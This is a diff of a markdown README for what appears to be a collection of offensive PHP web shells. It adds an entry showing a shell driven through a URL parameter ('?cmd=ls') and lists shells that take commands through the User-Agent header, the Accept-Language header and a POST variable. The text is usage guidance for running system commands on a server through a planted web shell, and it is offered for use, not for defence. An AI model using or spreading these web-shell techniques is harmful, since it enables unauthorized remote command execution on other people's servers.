@@ -1,8 +1,15 @@
 
 # PHP shells
 
+**(1) PARAMETER_SHELL**
 
-**(1) HTTP_USER_AGENT_SHELL**
+**SHELL COMMANDS USING PARAMETER**
+
+https://demo.com/PARAMETER_SHELL.php?cmd=ls
+
+****
+
+**(2) HTTP_USER_AGENT_SHELL**
   
 **SET SHELL COMMANDS IN USER-AGENT HEADER**
   
@@ -19,7 +26,7 @@ Accept-Language: en-GB,en-U
 
 ****
 
-**(2) HTTP_ACCEPT_LANGUAGE_SHELL**
+**(3) HTTP_ACCEPT_LANGUAGE_SHELL**
  
 **SET SHELL COMMANDS IN ACCEPT_LANGUAGE HEADER**
 
@@ -37,7 +44,7 @@ Accept-Encoding: gzip.
 ****
   
 
-**(3) POST WITH VARIABLE**
+**(4) POST WITH VARIABLE**
   
 **JUST ADD YOUR COMMAND IN VARIABLE B**
   
